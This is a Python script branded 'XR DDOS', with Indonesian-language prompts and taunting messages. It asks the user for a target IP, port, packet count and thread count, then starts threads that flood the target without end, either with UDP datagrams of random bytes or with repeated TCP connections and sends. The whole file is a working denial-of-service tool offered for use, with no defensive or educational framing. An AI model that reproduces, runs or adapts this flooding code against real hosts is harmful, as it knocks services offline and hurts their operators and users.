import random
import socket
import threading
import os,sys

os.system('clear')

print(">>>>>>>>>>>XR DDOS<<<<<<<<<<<")
print(">>>>>>>>>>>DISCORD LINK: Coming Soon<<<<<<<<<<<")
print(">>>>>>>>>>>Credit Tols: TrashX<<<<<<<<<<<")
print(">>>>>>>>>>>KING ACEE#6666<<<<<<<<<<<")

ip = str(input("[+] Ip/Host:"))
port = int(input("[+] Port/Host:"))
choice = str(input("[+] SERIUS MAU NYERANG? (y/n):"))
times = int(input("[+] Packets:"))
threads = int(input("[+] Threads:"))
def run():
        data = random._urandom(10006)
        i = random.choice(("[+]","[-]"))
        while True:
                try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                        addr = (str(ip),int(port))
                        for x in range(times):
                                s.sendto(data,addr)
                        print(i +" BRYAN NI DEK")
                except:
                        print("[!] MAMPUS")

def run2():
        data = random._urandom(10006)
        i = random.choice(("[]","[!]","[#]"))
        while True:
                try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.connect((ip,port))
                        s.send(data)
                        for x in range(times):
                                s.send(data)
                        print(i +" BRYAN NI DEK")
                except:
                        s.close()
                        print("[] MAMPUS DOWN EZ DEK")
            
for y in range(threads):
        if choice == 'y':
                th = threading.Thread(target = run)
                th.start()
        else:
                th = threading.Thread(target = run2)
                th.start()